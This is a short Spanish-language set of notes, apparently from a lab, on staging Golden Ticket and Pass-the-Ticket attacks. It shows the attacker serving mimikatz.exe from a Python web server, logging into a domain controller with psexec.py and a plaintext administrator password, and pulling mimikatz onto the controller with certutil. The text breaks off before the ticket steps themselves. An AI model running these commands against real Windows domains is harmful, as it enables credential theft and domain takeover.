# Golden Ticket & Pass The Ticket (PTT)

1º En mi maquina de atacante, localizo el mimikatz.exe 2º Copiamos al directorio en el que estemos 3º Levanto un sever web con python

```bash
locate mimikatz.exe
	/usr/share/windows-resources/mimikatz/Win32/mimikatz.exe
	/usr/share/windows-resources/mimikatz/x64/mimikatz.exe

cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .

sudo pyhton3 -m http.server 80
```

Ahora, desde otra terminal me conecto con `psexec.py` al usuario con credenciales

```
psexec.py deimcorp.local/Administrador:P@ssw0rd\!@100.100.100.138 cmd.exe
```

> Hay que escapar con `\` algunos caracteres especiales

Y ahora me transfiero el desde el DC, el `mimikaz.exe` que comparto

```
certutil.exe -f -urlcache -split http://100.100.100.131/mimikatz.exe mimikatz.exe
```

